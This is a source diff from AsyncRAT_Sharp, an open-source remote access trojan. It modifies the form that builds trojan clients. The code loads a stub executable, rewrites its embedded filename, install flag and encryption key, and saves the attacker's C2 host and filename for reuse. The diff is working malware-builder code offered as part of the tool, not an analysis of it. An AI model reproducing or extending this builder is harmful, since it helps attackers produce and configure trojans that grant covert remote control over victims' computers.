@@ -26,7 +26,7 @@ namespace AsyncRAT_Sharp.Forms
 
             try
             {
-                var md = ModuleDefMD.Load(Path.Combine(Application.StartupPath, "Stub.exe"));
+                var md = ModuleDefMD.Load(Path.Combine(Application.StartupPath, @"Stub\Stub.exe"));
                 foreach (TypeDef type in md.Types)
                 {
                     if (type.Name == "Settings")
@@ -49,11 +49,11 @@ namespace AsyncRAT_Sharp.Forms
                                     if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
                                         method.Body.Instructions[i].Operand = textFilename.Text;
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
-                                        method.Body.Instructions[i].Operand = textFilename.Text;
-
                                     if (method.Body.Instructions[i].Operand.ToString() == "false")
                                         method.Body.Instructions[i].Operand = checkBox1.Checked.ToString();
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
+                                        method.Body.Instructions[i].Operand = Settings.Password;
                                 }
                             }
                         }
@@ -63,11 +63,14 @@ namespace AsyncRAT_Sharp.Forms
                 saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                 saveFileDialog1.InitialDirectory = Application.StartupPath;
                 saveFileDialog1.OverwritePrompt = false;
-
+                saveFileDialog1.FileName = "Client";
                 if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                 {
                     md.Write(saveFileDialog1.FileName);
                     MessageBox.Show("Done", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    Properties.Settings.Default.DNS = textIP.Text;
+                    Properties.Settings.Default.Filename = textFilename.Text;
+                    Properties.Settings.Default.Save();
                     this.Close();
                 }
             }
@@ -96,7 +99,11 @@ namespace AsyncRAT_Sharp.Forms
         private void Builder_Load(object sender, EventArgs e)
         {
             comboBoxFolder.SelectedIndex = 0;
-            textPort.Text = Settings.Port.ToString();
+            textPort.Text = string.Join(",", Settings.Ports.ToList());
+            if (Properties.Settings.Default.DNS != null)
+                textIP.Text = Properties.Settings.Default.DNS;
+            if (Properties.Settings.Default.Filename != null)
+                textFilename.Text = Properties.Settings.Default.Filename;
         }
     }
 }
